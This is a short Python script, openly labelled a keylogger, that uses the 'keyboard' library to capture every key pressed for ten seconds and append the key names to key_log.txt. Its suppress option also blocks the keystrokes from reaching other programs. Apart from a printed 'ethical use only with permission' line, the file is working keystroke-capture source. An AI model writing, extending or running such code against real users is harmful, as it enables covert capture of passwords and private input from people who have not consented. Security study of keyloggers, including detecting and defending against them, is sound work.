import keyboard
import time
from datetime import datetime

log_file = "key_log.txt"
timeout = 10  # Timeout in seconds

def log_key(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.name)
            file.write(" ")
    except Exception as e:
        print(f"Error: {e}")

def start_keylogger():
    print("Starting keylogger... (Ethical use only with permission)")
    start_time = time.time()
    
    # Record keys until the timeout
    while time.time() - start_time < timeout:
        event = keyboard.read_event(suppress=True)  # Suppress output to terminal
        if event.event_type == keyboard.KEY_DOWN:
            log_key(event)
    
    print("Keylogging stopped after 10 seconds. Ethical use only with permission.")

if __name__ == "__main__":
    start_keylogger()
